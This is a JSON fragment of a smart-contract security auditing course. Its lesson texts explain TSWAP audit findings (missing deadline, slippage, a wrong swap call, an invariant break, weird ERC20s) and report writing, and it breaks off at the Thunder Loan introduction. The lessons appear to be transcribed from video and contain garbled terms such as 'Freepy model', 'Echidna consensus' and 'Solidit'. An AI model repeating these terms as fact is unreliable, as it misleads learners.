          "folderName": "41-missing-deadline-write-up",
          "description": "",
          "duration": 4,
          "videoUrl": "qteV4pVLpsb8eUQBXdkS3B101u1rYEMc00KsswAsTVjNM",
          "rawMarkdownUrl": "/routes/security/5-tswap/41-missing-deadline-write-up/+page.md",
          "markdownContent": "---\ntitle: Missing Deadline Write up\n---\n\n\n\n---\n\n# Addressing Deadlines in TSWAP Pool Deposits\n\nToday, we dive deep into an issue that has surfaced in blockchain tech involving TSWAP, a liquidity pool. The problem here is just like the proverbial time bomb that ticks regardless of one's awareness, in this case, an unused deadline set for pool transactions, which allows for the completion of transactions past the stipulated deadline. We will discuss the issue in detail, the impact it could potentially have, and offer a possible solution. So, let's roll!\n\n## The TSWAP Pool Deposit Deadline Issue\n\nAt the center of the storm is an issue where deadlines, when set, are unused in TSWAP pool deposits. If someone sets a deadline(let's say they plan to set it to execute the next block), paradoxically they could still deposit even after that deadline, resulting in a deadline dispute.\n\nThe TSWAP pool's function for deposits is missing a functionality check for deadlines. This lapse has graspable consequences, leading to transactions being completed even after the deadline.\n\n## Breakdown of the Issue\n\nThe heart of this problem lies within the transaction **deposit function**. This function accepts a **deadline parameter**, as according to the documentation. The purpose of this parameter is to set a deadline to complete a transaction. However, this parameter is never utilized, which leads to unfortunate outcomes.\n\nTransactions that aim to add liquidity to the pool may be executed at unexpected times and under unpredictable market conditions, where the deposit rate may not be favorable. This issue can also make these transactions susceptible to MEV(Maximal Extractable Value) attacks.\n\nHere, the impact could be that transactions get sent when market conditions are not ideal for deposit, even in the presence of a deadline parameter.\n\n## Proof of Concept, and Potential Solution\n\nWe could illustrate the issue in a more demonstrable manner by writing a 'Proof of Concept' here, but we'll dive into more about 'Proof of Concepts' in later content.\n\n```markdown\n- Consider making the following adjustment to the deposit function.- We'll grab this entire function here:\n- Include a revert if the deadline has passed.\n```\n\nThis revision will cause the function to halt and revert if the deadline is exceeded.\n\nAs you can see in the preview, we've successfully included a revert function for an exceeded deadline, marking a critical step towards a viable resolution.\n\n## The Medium versus High Debate\n\nAn intriguing query came about while attending to this dilemma: is the urgency of this a high or just a medium?\n\nDiscussing the impact of the issue offers some clarity. A likelihood of transactions being executed when market conditions are unfavorable does exist, even in the presence of a deadline parameter. However, remember that this is purely a deposit, not a swap.\n\nWe're still acquiring liquidity tokens that signify ownership of the pool. Even if everyone else exited the pool, we'd still have these tokens. Consequently, it could be argued that this issue qualifies as 'medium' in terms of urgency and risk, rather than 'high'. One cannot explicitly overlook the fact, but under the abovementioned circumstances, it's fair to categorize this as a medium.\n\nIn conclusion, deadlines exist for a reason and respecting them within the blockchain world, quite like in the real world, ensures smooth transactions and user trust. Ignoring them, as seen in this TSWAP pool deposit issue, can lead to unwanted complications with potentially damaging impacts. Always stick to deadlines, folks!\n",
          "updates": []
        },
        {
          "lessonId": "317d8851-ad4e-4b30-b518-58065007ed9f",
          "number": 42,
          "title": "Reporting Continued",
          "slug": "reporting-continued",
          "folderName": "42-reporting-continued",
          "description": "",
          "duration": 10,
          "videoUrl": "HReyNYNiSfwfTTDBQ9zmnGzghKq6uvwPvX5C6Q3wk6M",
          "rawMarkdownUrl": "/routes/security/5-tswap/42-reporting-continued/+page.md",
          "markdownContent": "---\ntitle: Reporting Continued\n---\n\n\n\n---\n\n# Audit Deep Dive: Understanding Smart Contract Vulnerabilities\n\nWhen it comes to auditing smart contracts, there are a lot of nitty-gritty details that one needs to pay attention to in order to prevent possible vulnerabilities.\n\nThroughout this detailed walkthrough, we're going to focus on the process of identifying issues within code, their potential impact, and proposed solutions.\n\nBut before we dive in, let's address some essential concepts:\n\n- **Constants**: These are unchanging variables that are quite common within code and should always be treated as such.\n- **Informationals**: These are facts or pieces of data provided in the code intended to be helpful, but if not emitted correctly, they can cause confusion.\n- **Audit comments**: These serve as notes during code reviews, particularly useful when something needs to be addressed later.\n\n## Highlighting the Importance of Reporting\n\nDuring an audit, it's important to report anything that could potentially refactor the code to improve its overall quality. One simple way is to state \"reported\" whenever we encounter any issues in the code.\n\n## Understanding the Importance of Code Layout\n\nThe code layout plays a crucial role in readability, maintainability, and usability. It is not uncommon to suggest relocating a section of code (such as â€˜audit infoâ€™) that might provide more clarity in another position.\n\n## Liquidity Add Misstep\n\nAt one point in our code, we encountered an instance where 'liquidity added' was incorrectly ordered. Missteps such as these could lead to the emission of incorrect data. To provide clarity:\n\nLiquidity added has parameters out of order.The root cause is the TSWAP pool.The event has parameters out of order, causing the event to emit incorrect information.\n\n## Severe Impact Issues\n\nWe found two severe issues during our audit:\n\n1. **Order of Parameters Issue:**\n\n   In the function `addLiquidityMintAndTransfer`, a liquidity added event is emitted, but the values are logged in the wrong order:\n\n   When the `liquidity added` event is emitted in the `add liquidity mint and transfer` function, it logs values in an incorrect order. The pool tokens to deposit value should go in the third parameter position, whereas the WETH to deposit value should go second.\n\n2. **Fee Calculation Error:**\n\n   The `getInputAmountBasedOnOutput` function was found to have an incorrect fee calculation, which causes the protocol to take too many tokens from users:\n\n   The `get input amount based on output` function in the TSWAP pool is intended to calculate the amount of tokens a user should deposit given an amount of output tokens. However, the function currently miscalculates the resulting amount when calculating the fee.\n\nBoth of these issues cause a significant detriment to the users and need immediate addressing.\n\n## Power of Writing Proof of Codes\n\nWriting 'proof of codes' is a crucial skill that every auditor should have. It helps not only in proving the existence of issues but also in testing the codebase for other potential vulnerabilities. For example, a 'proof of code' was written for the incorrect fee calculation issue to highlight how much the protocol takes as fees and the actual value.\n\n## Impact of Small Code Errors\n\nEven small errors or inconsistencies in the code can have large implications and result in incorrect information being disseminated. Such was the case with the `Swap exact input` function, where an incorrect return value was always being given(0) irrespective of the actual values.\n\nIn conclusion, auditing requires a keen eye for details, significant knowledge of smart contract coding, and a thorough understanding of possible vulnerabilities. Avoiding magic numbers, maintaining consistency in reporting, and having proficiency in writing 'proof of codes' are all crucial factors to conducting a successful audit.\n\nWe hope that this detailed walkthrough gives you perspective and jumpstarts your journey towards becoming a proficient smart contract auditor!\n",
          "updates": []
        },
        {
          "lessonId": "13054677-68a6-44cc-aa34-d9eafe463071",
          "number": 43,
          "title": "Reporting: No Slippage Protection",
          "slug": "no-slippage-protection",
          "folderName": "43-no-slippage-protection",
          "description": "",
          "duration": 8,
          "videoUrl": "eHewVkWuIUf71ykZTpqwKOSut5pWhRg99KNLcPgokFM",
          "rawMarkdownUrl": "/routes/security/5-tswap/43-no-slippage-protection/+page.md",
          "markdownContent": "---\ntitle: No Slippage Protection Write up\n---\n\n\n\n---\n\n## Mitigating Slippage Impact in DeFi Protocols\n\nThe topic for today's post revolves around a crucial aspect of DeFi (Decentralized Finance) transaction executed through protocols like MetaMask. Specifically, we will be focusing on `slippage` and how a lack of protection can adversely affect the user experience.\n\n### What is Slippage and why should it concern you?\n\nIn a nutshell, slippage occurs when the execution price of a transaction is different from when the transaction was originally created. This can be due to market volatility causing rapid price changes. High slippage can result in a user receiving fewer tokens than anticipated, or, conversely, paying more than expected for a specified quantity of tokens.\n\n> If you're new to smart contracts, think of slippage like unwanted change in your transaction, which you'd prefer not to experience.\n\nBoth situations can be distressing for users, and are likely to negatively impact the trust and usability of the protocol.\n\n### Why Slippage Protection is Crucial\n\nFrom the risk perspective, we'd label this as `High` due to the potential impact. Despite the likelihood being categorized as medium to high, the severity of the potential financial loss warrants its high-risk status.\n\nAn interesting gateway to delve into this topic is through the study of `swap exact input` and `swap exact output` functions in smart contracts and their associated slippage protection measures.\n\nTake, for example, **TSWAP pool swap exact output** that lacks slippage protection. If market conditions change while a transaction is waiting to be processed, this lack of slippage protection could lead to users receiving far fewer tokens than expected.\n\nA practical manifestation would be when a user attempts to swap 10 WETH (Wrapped Ether) for DAI (a stablecoin pegged to USD). The user is expecting to get a minimum of 100 DAI, but due to the lack of slippage protection, they might end up receiving less than 100 DAI if the price of WETH depreciates before the transaction is completed.\n\n### How to Guard Against Slippage\n\nA smart contract's code can be revised to include slippage protection. This precaution will ensure that the tolerable maximum or minimum amount is strictly adhered to, despite any sudden market price changes for the involved tokens.\n\nThe way to do this is through implementing a maximum input or minimum output parameter, effectively giving a safety net for users to not receive less or pay more than expected.\n\nThe `maxAmountIn` serves as a limit for how much the user is willing to spend, introducing a safety parameter within the code.\n\n### The Importance of a Proof of Concept (POC)\n\nHaving a POC helps a lot when trying to communicate potential risks to a protocol. To illustrate, here's a simple scenario:\n\n- User initiates a `swapExactOutput` for 1 WETH (WETH=1000 USDC) with input token as USDC and output token as WETH.\n- No maximum input amount allowed, transaction is pending in mempool.\n- Market price of WETH skyrockets to 10,000 USDC.\n- User completes the transaction but is charged 10,000 USDC instead of the expected 1,000 USDC.\n\nThis excessive charge to the user occurs due to no slippage protection. Creating a POC for this scenario will not only help protocol developers understand the implications but also provide a pathway to tackle the problem.\n\nHaving a max input amount parameter ensures that users can predict how much they spend on the protocol.\n\n### Wrapping Up\n\nWhile some might argue that the user could approve fewer tokens or reject the transaction, the reality is that these aren't foolproof solutions. Protecting against slippage is critical for maintaining user trust and enhancing the protocol's usability.\n\nUnderstanding slippage and how it affects your transaction can provide significant benefits and prevent unexpected loss. The control it provides the trader can be the difference between a `successful transaction` and a `bad experience`.\n\nAlthough our focus here was on setting it to high, remember that the risk severity of every case varies, and one could always argue **contextual flexibility** based on each unique situation.\n",
          "updates": []
        },
        {
          "lessonId": "6705c7ca-1ec8-4953-b7b8-e3e9e13a17f2",
          "number": 44,
          "title": "Reporting: Sell Pool Tokens",
          "slug": "sell-pool-tokens-write-up",
          "folderName": "44-sell-pool-tokens-write-up",
          "description": "",
          "duration": 4,
          "videoUrl": "b6WPpEmm018lYqnwV7ZOWMjlyqNT3DpLIFuo6awA7jx00",
          "rawMarkdownUrl": "/routes/security/5-tswap/44-sell-pool-tokens-write-up/+page.md",
          "markdownContent": "---\ntitle: sellPoolTokens write up\n---\n\n\n\n---\n\n# Unraveling Smart Contract Bugs: 'Sell Pool Tokens' Woes\n\nIn the chaotic and fast-paced world of blockchain programming, errors aren't just inconvenient; they can cost money. A lot of money. One notorious mistake often found in the wild is related to token swapping - that is, exchanging tokens within a liquidity pool. Today, we're diving into one high severity bug associated with a `sellPoolTokens` function.\n\nThe nature of this bug means the token swapping feature doesn't operate as expected, causing users to receive an incorrect number of tokens during transactions. Let's delve into this troublesome gaffe further.\n\n## What's Going on with 'Sell Pool Tokens'?\n\nThe `sellPoolTokens` function is designed to enable users to efficiently sell pool tokens and receive Wrapped Ether (WETH) in return. Users specify how many pool tokens they're prepared to sell via the `poolTokenAmount` parameter.\n\nHowever, this function has a miscalculation issue with the swapped amount, directly linked to the incorrect function call. The current `sellPoolTokens` function calls the `swapExactOutput` function, but it should call `swapExactInput` instead. Why is this a problem? Because users specify the precise input tokens volume, not the output.\n\n> \"Users will swap the wrong amount of tokens, which is a severe disruption of protocol functionality.\"\n\n## Breaking Down the Proof of Concept\n\nThe proof of concept for this takes form in pseudo code, illustrating the botched token swap during a `sellPoolTokens` call. We'd typically piece together a proof-of-code here to further demonstrate this issue practically.\n\n## Addressing the Bug: Recommendations for Mitigation\n\nTo tackle this damaging bug, the proposed mitigation strategy is restructuring the implementation to deploy `swapExactInput` instead of `swapExactOutput`. This, however, demands a modification to the `sellPoolTokens` function to accommodate a new parameter dubbed `minWETHtoReceive`.\n\nBut wait, there's more! Area for improvement exists beyond this immediate bug fix. It would be prudent to introduce a deadline to the function as no deadline currently exists. This is a crucial topic for later exploration in the blog series, particularly when we delve into Miner Extractable Value (MEV). For the time being, though, we'll set this to one side.\n\nThe `sellPoolTokens` bug is, rather deceptively, a compelling example of how small errors can disrupt the functionality of decentralized protocols dramatically. By presenting the concept and outlining potential solutions, we hope to contribute to more robust, secure, and user-friendly DeFi platforms.\n\nLet's keep debugging!\n",
          "updates": []
        },
        {
          "lessonId": "3bed02c1-41e4-4860-bbe7-ff32160fa6ac",
          "number": 45,
          "title": "Reporting: Invariant Break & PoC",
          "slug": "invariant-break-write-up-and-poc",
          "folderName": "45-invariant-break-write-up-and-poc",
          "description": "",
          "duration": 9,
          "videoUrl": "D1S2sYFj00KC00K4crzZ501cig8KZLOBKeH17WMs4zfAUk",
          "rawMarkdownUrl": "/routes/security/5-tswap/45-invariant-break-write-up-and-poc/+page.md",
          "markdownContent": "---\ntitle: Invariant Break Write up and PoC\n---\n\n\n\n---\n\n# Fuzz Testing: The Key to Proof of Code\n\nThis blog post is going to take you on a journey through the layers of code to uncover the details of proof-of-the-coding process, with an emphasis on fuzz testing.\n\n## Fuzz Testing: What it is and why we need it?\n\nAccording to the [Software Engineering Institute](https://resources.sei.cmu.edu/asset_files/WhitePaper/2016_019_001_466377.pdf) at the Carnegie Mellon University, fuzz testing (or simply fuzzing) is an automated dynamic testing approach that generates and runs many random inputs to a target program. It's efficient and does a great job at highlighting potential errors, but the use of fuzz tests as proof of code is problematic.\n\n> \"This is because the sequences that they generate can be quite complex and hard to understand - not to mention, they may not necessarily lead to the most efficient code. It can be downright baffling, especially for less experienced developers.\"\n\nAs a workaround, we need to take the output of the fuzz test and mold it into a more reader-friendly format. The goal here is to convert the fuzz test output into a unit test that clearly illustrates how the protocol should rectify the issue.\n\n## Creating a Universal Proof of Code\n\nLet's illustrate this by trying to rectify a protocol invariant error.\n\nThe fuzz test, in this case, shows that it only takes **ten swaps** to break the invariant. Hence, our next step is creating a **new unit test** to replicate these swaps.\n\n## Decoding the Fuzz Test Output\n\nTo better understand the issue at hand, frame a `testInvariantBrokenProof` function based on the fuzz test output.\n\nCreate a sequence of swaps, replicating the fuzz test output. Start with performing only one swap to verify that the code correctly detects a deviation from the norm. Remember to keep verifying the result at each step.\n\nIf all runs smoothly, increase the number of swaps. In this example, we increment it to **nine swaps**.\n\n## Reflect, Retest, Report!\n\nAfter the completion of your revised unit test, it's time to document the results.\n\n_\"Always start your report with a detailed description of the issue at hand. Explain the root cause, provide a description, and elaborate the impact it can cause. This helps provide a comprehensive understanding of the problem.\"_\n\nOnce that is complete, present your Proof of Concept, diligently highlighting all steps and intricacies of your solution. By this point, you should have a detailed and well-stated report laid out.\n\n## Wrap Up!\n\nOne of the last yet crucial parts of the report is to provide potential mitigation strategies. They could include removing the incentive or keeping it, but accounting for a change in the protocol invariant. Regardless, it is essential to offer actionable recommendations that work best not only at maintaining the protocol's functionality but also at preventing potential breaking of their core invariant.\n\nBy breaking it down into digestible pieces and providing both context and clear instruction, we can transform the cryptic output of fuzz tests into a proof of code that every team member can readily understand.\n",
          "updates": []
        },
        {
          "lessonId": "5b32ca72-ccda-4365-a1b5-59ecfa62371e",
          "number": 46,
          "title": "Reporting: Weird Erc20",
          "slug": "writeup-weird-erc20",
          "folderName": "46-writeup-weird-erc20",
          "description": "",
          "duration": 4,
          "videoUrl": "h2ZqgrKiyVgW28uUdPiNb9mipWOyHfnnrweMBoau4FY",
          "rawMarkdownUrl": "/routes/security/5-tswap/46-writeup-weird-erc20/+page.md",
          "markdownContent": "---\ntitle: Write up Weird ERC20 You Try This\n---\n\n\n\n---\n\n# Unveiling the Mystery of Tokens while Penning an Audit Report for TSWAP\n\nCracking the codes and giving insight into the deep trenches of developmental methods, we're all set to discuss and dig into the topic of tokens. For us, ERC20s proved to be peculiar to work with, challenging some of our pre-established perceptions and notions. We're going to rewind a little and talk about the one crucial aspect we didn't happen to discuss in detail, the token matter.\n\n## Unpacked: The Token Hidden Conundrum\n\nAn interesting observation was that we didn't host this test on a TSWAP pool. Let me take you back to our chapter on the TSWAP pool. This episode demonstrated our swap function falling apart, breaking the invariant as an extra transfer was conducted in the process.\n\n> Blockquote: Diving into this will reveal that the fee-on-transfer tokens echo the same effect, transmitting extra tokens. Remember, when the fee-on-transfer tokens come into play, they pose a threat to the protocol invariance, demanding attention.\n\n## Transparency - The Token Assassins\n\nHere's an interesting fact - in the TSWAP audit GitHub repository associated with this course, we unfolded some significant details.\n\n```markdown\nGo to - Audit Data -> README -> Bottom Page\n```\n\nThis process reveals two audits previously conducted for the Uniswap v1. Further venturing into the Uniswap v1 audit report fashioned by Consensus Diligence, we found several issues with websites and liquidity.\n\nThe v1 of Uniswap suffered a condition where the liquidity pool could be hijacked by certain tokens, for instance, ERC777.\n\n> Think of these tokens as smoke and mirrors. If these tokens paved the way for reentrancies on the transfer, the liquidity could be drained, leaving us high and dry. The introduction of these strange ERC20s into the original Uniswap v1 caused series of issues for protocols.\n\n## The TSWAP Paradox\n\nWhat's worth noting is that these confusing ERC20s are a significant issue in DFI. They can be a handful to work with due to their distinct characteristics. It might seem enticing if they were all similar, but alas, that's not the case. This issue tends to pop up often, particularly in competitive audits, as many protocols are oblivious to this aspect.\n\n## Drafting the Audit Report\n\nIn our discoveries, our conclusive medium (not fully penned down) anticipates additional exploration and experimentation from you. Accept the challenge and bask in the experience of creating proof codes and get playful with the process.\n\nSurprisingly, you'll come across these familiar ERC20s repeatedly. It almost feels as though they're playing peekaboo, secretly popping out at the most unexpected times.\n\n## Conclusion\n\nThere's a great deal of satisfaction in unlayering these complexities and jotting down findings. The ordeal of wielding together an audit report surprisingly paves the way to add more to our developmental platter. The report initiates the process of understanding and recognising the challenges and solutions in protocol handling, making the world of tokens and audits a little less complicated and a lot more intriguing.\n",
          "updates": []
        },
        {
          "lessonId": "fdca1d04-2481-4cbb-8657-27747fa56f3d",
          "number": 47,
          "title": "Creating Pdf For Your Portfolio",
          "slug": "creating-pdf-for-your-portfolio",
          "folderName": "47-creating-pdf-for-your-portfolio",
          "description": "",
          "duration": 4,
          "videoUrl": "z2O5AahTaDsqpOBVWwiPJgwJK6Znza5wzsGZbLl1rRU",
          "rawMarkdownUrl": "/routes/security/5-tswap/47-creating-pdf-for-your-portfolio/+page.md",
          "markdownContent": "---\ntitle: Creating the PDF for your Portfolio\n---\n\n\n\n---\n\n# Building an Audit Report: A Step by Step Tutorial\n\nBecoming proficient in creating an audit report involves mastering certain techniques. Throughout this post, you'll learn how to create an audit report tailored to your unique needs using available resources and Markdown tools.\n\n![](https://cdn.videotap.com/y8C5WoYeGfIBalrcsQSJ-11.25.png)\n\n## Step 1: Importing Files\n\nBefore we venture any further, we must first import the files we need. For instance, we've previously used a logo PDF file in our audit data folder, which you can easily repeat. Scope out your directories for relevant files before you start crafting your report.\n\n## Step 2: Leveraging the Audit Report Template\n\nDon't start creating your report from scratch! Utilize available templates to help guide you in building an informative and detailed review. You can find a well-crafted audit report template on our course page. To get the template, go back to the course, scroll upwards until you come across the template.\n\nSimply copy the content from the raw version of the template and paste it into your new file called 'Report Template MD'.\n\n## Step 3: Tailoring the Report\n\nHaving a template is splendid, but personalizing it to suit your audit changes the game. Let's rename the report template to '2020 311 one' and let's call it 'TSWAP audit MD'.\n\nFeel free to insert the findings of your audit into the document. Let's add findings, a summary of the issues discovered and any recommendations you may have under the sections provided in the template.\n\n> _Remember your findings should be as descriptive and detailed as possible to provide the most value._\n\nTo enhance your portfolio even further, spend some time writing up explanatory notes and if you had collaboration during the audit process, feel free to add their findings as well.\n\n## Step 4: Updating the Details\n\nTaking the time to update information accordingly is definitely vital. You might need to add audit details, scope, and list the issues you encountered. To visualize some parts of your report, say the risk classifications, you can include charts. Simply grab any chart you find illustrative enough and paste it into the report.\n\nFor example, you can provide the severity level of the identified issues found during your audit. We're going to say we found four high-risk issues, two of medium risk, and two of low risk. Informational issues can be many.\n\n## Step 5: Finalizing and Converting the Report\n\nHaving updated the details, now is the perfect time to finalize your report. Set the report title, include your name(s), add protocol summary, risk classification, and audit scope details.\n\nTo convert the markdown file into a professional-looking PDF document, we can use [pandoc](https://pandoc.org/getting-started.html), a very useful document converter.\n\nAnd voila! Your PDF audit report is generated and ready for presentation, filled with detailed findings and code snippets.\n\n![](https://cdn.videotap.com/gTjSzByU5kxK3CrXUbph-174.38.png)\n\n## Step 6: Displaying Your Report\n\nWith the diligent work done, it's time to share your accomplishment to the world. Update your GitHub with the audit report or include a new report in your portfolio. Constantly creating and adding audit reports boosts your portfolio and betters your skills.\n\nA job well done! By completing this tutorial, you've learnt to create a detailed, personalized audit report. Incredibly, through conducting audits, you've also gained substantive knowledge of DeFi protocols.\n\nRemarkably, as we go through smart contracts- like the T-swap contract, a variation of Uniswap, you also gain substantial understanding of decentralized exchanges at the fundamental level.\n\nTaking on real-world tutorials like these not only equip you with practical auditing skills but also provide you with a strong foundation in the fast-growing field of Decentralised Finance (DeFi).\n\n> \"We're not just teaching you how to conduct audits. We're also teaching you DeFi along the way. Very sneaky, aren't we?\"\n",
          "updates": []
        },
        {
          "lessonId": "64901db8-395b-4ac7-a32c-a884c6189d02",
          "number": 48,
          "title": "Recap",
          "slug": "recap",
          "folderName": "48-recap",
          "description": "",
          "duration": 8,
          "videoUrl": "OPWMnJ6eyRrsMexylCRIaU4900uXYDjn6EogptmHQ5Zc",
          "rawMarkdownUrl": "/routes/security/5-tswap/48-recap/+page.md",
          "markdownContent": "---\ntitle: Recap\n---\n\n\n\n---\n\n# DeFi Security Auditing â€“ A Recap\n\nHey there! If you've been with us from the start of our series on DeFi Security Auditing, congratulations on reaching this point! This is going to be a recap encompassing everything you've learned so far in the course. In case you missed out on something, donâ€™t worry, let's walk through them again.\n\n## Protocol Invariants â€“ Your Secret Weapon\n\nFirst and foremost, we realized that understanding protocol invariants is crucial in locating bugs hidden in our code bases. We donâ€™t even need to explore the code base deeply or conduct a tedious manual review. We found how we can write an invariant or a stateful fuzzing test suite, which pointed out a bug in the swap function â€“ a process without any manual review.\n\nIn essence, the tooling, particularly stateful fuzzing, is a powerful mechanism for bug detection.\n\n## Unfolding the AMM Mystery\n\nWe touched upon the underlying fundamentals of an AMM, or Automated Market Maker, and what a DEX (Decentralised Exchange). Even though the T-Swap audit revolves around a fictitious protocol, its foundation is based on Uniswap and follows exactly the same X times Y equals K principle.\n\nWe learned that the AMM works without an order book. It simply uses token pools, and to extract tokens from one side, tokens need to be added to the other side, maintaining the balance. Everyone is on the lookout for a platform where every swap transaction means money in their purses.\n\n## Understanding the Uniswap Protocol\n\nBoiling down the core mechanisms of the Uniswap protocol, X multiplied by Y equals K is the mathematical model where K is a constant, ensuring the token ratio remains unchanged. Every time you wish to take a token, you need to provide an equivalent amount back.\n\nDealing with a protocol like an AMM where math is the crux of the system, the importance of invariants is highlighted.\n\n## Identifying Client Requirements\n\nEarlier, the absence of illustrative graphs and even the lacking of documentation for some functions made working somewhat daunting. But over time, we've learned that we need to function hand-in-hand with the protocol. They always have the inside story, and understanding their needs is indispensable.\n\nOur comprehensive client onboarding document illustrates this point, particularly the section about T-SWAP having onboarded. We learned that onboarding our protocols and obtaining as much information as possible is of utmost importance.\n\nA case in point would be their low test coverage, an issue we'd definitely want them to address. They churn out multiple ERC20s. And if you don't know by now, ERC20s are pretty wacky. Understanding this helps to architecturally protect the protocol from the peculiarities of these ERC20s.\n\nWe also learned that it's not advisable to work with any and every ERC20. Instead, a restriction list or documentation indicating potentially problematic tokens (like rebasing tokens, fiat transfer tokens, reentrancy tokens) is a good practice. Hence, an extensive onboarding document and deep client interaction can take you a long way.\n\n## Keeping Invariants in Check\n\nOur journey took us through understanding what protocol invariants are â€“ they represent those attributes of the system that must always remain constant. We learned to write fuzzing or stable fuzzing tests to go hand in hand with them.\n\nReferencing the Freepy model where protocol invariant checks are directly embedded into the system, Uniswap stands as a good example of such a system. In stark contrast was the Euler finance attack, where the absence of an invariant check led to their exploit. But people do differ on nomenclature, some prefer to call it CEI and pre and post-checks.\n\n## Diving into DeFi\n\nThe constant product formula X \\* Y = K, oft-used in many DeFi protocols, particularly AMMs, is a powerful tool. For more adventurous explorations into the realm of DeFi, DeFi Llama is a great resource.\n\nHaving said that, we were also introduced to other beneficial tools like stateful and stateless fuzzing, Echidna consensus, and other fuzzers. Although mutation or differential testing didn't make it onto the list, they're definitely on the cards for future lessons.\n\n## Deciphering Solidit\n\nSolidit presented itself enormously useful, allowing us to cross-check if an issue has been previously pointed out by someone else. It helps us to learn about new findings and also verify if we're on the right track.\n\n## Welcome to A World Of Weirdness\n\nNo, we're not stepping into a horror movie. Welcome to the world of ERC20s, where weird is the new normal, and this trend doesn't seem to be fading. But not to worry â€“ Trail of Bits has provided a handy checklist to make sure you're making the right choices. There's also a master list naming all the weird ERC20 tokens â€“ a post-apocalyptic catalog if you'd wish to call it so.\n\n## Concluding Thoughts\n\nIf youâ€™ve accompanied us this far, give yourself a round of applause. It's remarkable progress considering the level of understanding you now hold. You've essentially audited the Uniswap codebase and are now fully equipped to delve into the world of security, undertake competitive audits, bug bounties, or even get hired!\n\nNevertheless, we recommend you complete the course to further enrich your learning. Pat yourself on the back for your achievement, take a well-deserved break, and get ready to tackle some challenges ahead.\n",
          "updates": []
        },
        {
          "lessonId": "2183b4e7-d6f9-4d3b-ba24-179fa1df2c95",
          "number": 49,
          "title": "Exercises",
          "slug": "exercises",
          "folderName": "49-exercises",
          "description": "",
          "duration": 3,
          "videoUrl": "v01JVS2ZF5X00q89OsRxM9dIqqnwn00rLiWtr2wg02S136A",
          "rawMarkdownUrl": "/routes/security/5-tswap/49-exercises/+page.md",
          "markdownContent": "---\ntitle: Exercises\n---\n\n\n\n---\n\n# Exciting Dive into Smart Contract Fuzz Testing and Learning Techniques\n\n### Exploring Tint's Code Error\n\nThe other day, Tint was kind enough to share a fascinating gist that truly piqued my interest. It contained a small snippet of a code base that had one glaring issue. Of course, it was not just the issue itself that caught my attention, but more so what this issue represented - an exciting opportunity to start honing your smart contract fuzzing skills with Foundry.\n\n![](https://cdn.videotap.com/cVgMHZy43EUCFjsPdVYm-15.24.png)\n\nThe scenario offered by this code base is straightforward. It features a registry contract that permits callers to register by paying a predetermined fee in ETH. If the caller sends too little ETH, the execution reverts. However, if they send too much ETH, the contract obliges by returning the extra funds.\n\nLooking at the unit test reports, everything seems perfect- right? But hold your horses; there's a twist. Your challenge is to write at least one fuzz test via the registering contract. This fuzz test must correspond to the brief specification above and capable of detecting a bug in the register function.\n\nAlways remember to undertake this task before moving ahead. Why? Because it can remarkably hone your fuzz test writing skills.\n\n### Amplify Learning with Social Media\n\nAmidst this coding, let's spice things up with a tad bit of tweeting. Don't be confused, it's a part of the process. Remember, as a security researcher (focus on the 'researcher'), you aim to excel at researching and comprehending issues. Go forth, dive into Solidity and learn something unique.\n\nYou can start with something as straightforward as reentrancy. As a topic we've repeatedly discussed and will continue to, there's a wealth of knowledge to be extracted. Find examples of different reentrancy attacks- perhaps the highs. Choose a crazy reentrancy attack, learn about it, break it down and share your learning on Twitter.\n\n> _\"One of the best ways to learn is something called the TeachBack Method, where if you teach something back to somebody, that is a great way to learn.\"_\n\n### Take a breather\n\nNow seems like an excellent time to grab a cup of coffee and unwind for a bit.\n\nIf you haven't yet signed up for [codehawks](https://codehawks.com), now's the time! We have exceptional first flights lined up that will give you the confidence boost you need.\n\n![](https://cdn.videotap.com/08R5XEP6FtKgKciMJKrm-101.6.png)\n\n### Coming up next...\n\nBrace yourself for Section Six with Centralization Proxies and Oracles featuring the intimidating Thunder loan audit. We will also cover Boss Bridge before moving on to tackling the Vault Guardians Boss codebase.\n\nSo, gear up, recharge your brains with a coffee break, and let's dive into the world of smart contracts!\n\nSee you soon folks.\n",
          "updates": []
        }
      ]
    },
    {
      "number": 6,
      "sectionId": "e0cddd25-1df1-4c9f-af68-53e33c616bad",
      "title": "Thunder Loan",
      "slug": "thunder-loan",
      "folderName": "6-thunder-loan",
      "lessons": [
        {
          "lessonId": "9666c162-de47-4243-b6b9-cf754d78d588",
          "number": 1,
          "title": "Introduction",
          "slug": "introduction",
          "folderName": "1-introduction",
          "description": "",
          "duration": 6,
          "videoUrl": "zWgkMEoGiBV9K02UTK67D7AOzef9X8dKVwf01H6f5zyog",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/1-introduction/+page.md",
          "markdownContent": "---\ntitle: Introduction\n---\n\n\n\n---\n\n# Deep Dive into Security Testing with the Thunder Loan Audit\n\nWelcome back to your favorite security course repository! I trust you've spent some time on that fuzzing exercise because this lesson is going to be a _real deep dive_ into security testing. We've already learned tons of tools and skills, and now it's time to really apply and hone those skills as we dig into _Section Six: Thunder Loan Audit._\n\n## The Context: Thunder Loan Protocol\n\nLet's begin by git-cloning this lesson's code fro Github.\n\n![](https://cdn.videotap.com/iLoskdCcOE28WEUkiXTF-68.76.png)\n\nThis richly detailed protocol we'll be auditing has a fantastic logo - a frog with a thunder bolt on its chest standing over a pile of money. However, beneath this cool exterior, there lies a multitude of bugs waiting to be smoked out. This protocol also gives us a detailed experience of two of the most important DeFi protocols in the world, _Aave and Compound_, as it's majorly based on these.\n\n## DeFi, Borrowing, and Lending\n\nThese protocols are the crux of DeFi borrowing and lending, a fundamental financial concept in the DeFi universe. Whilst auditing the Thunder Loan protocol, we'll naturally delve a bit into understanding Aave and Compound.\n\n## Pricing Information and Oracles\n\nWe had a touch on this in the Puppy Raffle exercise. However, here we delve deep into the significance of sourcing accurate pricing information for assets and how to ace this process effectively as we interact with Oracles.\n\n> \"A lot of people use \\[upgradable contracts\\]. We need to know how to keep them secure.\"\n\n## Upgradable Contracts\n\nFor the first time, we'll be interfacing with an upgradable contract, a common feature in the wild world of Web 3. Now, whether or not these contracts are optimum is up for debate, but their usage is indeed undeniable.\n\n## Multifaceted Proxies\n\nWe are not going to be delving deep into the multifaceted proxy, also known as _the diamond standard_, but we're definitely going to talk a bit about its functionalities and distinctive features.\n\n![](https://cdn.videotap.com/bnzGy4zQOk9RwQjEXVOh-189.08.png)\n\nMoreover, we'll be learning about another brilliant tool called the **Upgrade Hub**. This tool comes in handy for discerning which contracts have been upgraded and which upgrades might be construed as rug pulls. By inserting a contract address, you'll be able to view its complete upgrade history, appearing similarly to git diffs.\n\n> \"Upgrades are highly sensitive in the Web 3 world. This \\[Upgrade Hub\\] is a great place to learn about and work with proxies and view their 